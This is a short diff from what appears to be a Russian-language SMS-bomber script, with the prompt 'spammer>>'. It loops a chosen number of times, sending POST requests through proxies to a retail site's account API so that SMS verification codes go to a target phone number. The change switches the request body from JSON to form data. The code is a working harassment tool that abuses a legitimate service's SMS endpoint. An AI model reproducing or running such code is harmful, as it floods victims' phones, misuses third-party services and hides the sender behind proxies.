@@ -51,7 +51,7 @@ else:
 run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))
 for _ in track(range(run)):
  try:
-         requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "stage": "1", "login": "Василий", "phone": number}, headers=headers, proxies=proxies)
+         requests.post("https://bi.ua/api/v1/accounts", data={"grand_type": "sms_code", "stage": "1", "login": "Василий", "phone": number}, headers=headers, proxies=proxies)
          print('bi.ua')
  except:
          print('Не отправлено (bi.ua)')
